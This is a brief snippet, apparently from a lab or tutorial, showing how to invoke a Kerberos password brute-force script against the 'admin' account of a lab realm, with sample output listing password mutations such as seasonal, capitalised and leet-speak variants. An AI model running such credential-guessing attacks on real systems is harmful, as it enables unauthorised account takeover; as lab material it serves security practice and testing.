python3 kerb_bruteforce_advanced.py \
    -r LAB.LOCAL \
    -k 192.168.88.20 \
    -u admin \
    -p passwords.txt \
    -t 8 \
    --smart

# Smart generation creates hundreds of variations:
# [*] Generating password variations...
# [+] Generated 847 total password variations
# 
# Includes:
# - password, Password, PASSWORD, Password1, Password123
# - Spring2025, Spring25, Summer2024, Fall2024
# - January2025, February2025
# - password!, password@, password#
# - 2025password, Adminpassword
# - p@ssword, pa$$word (leet speak)
# - And many more...
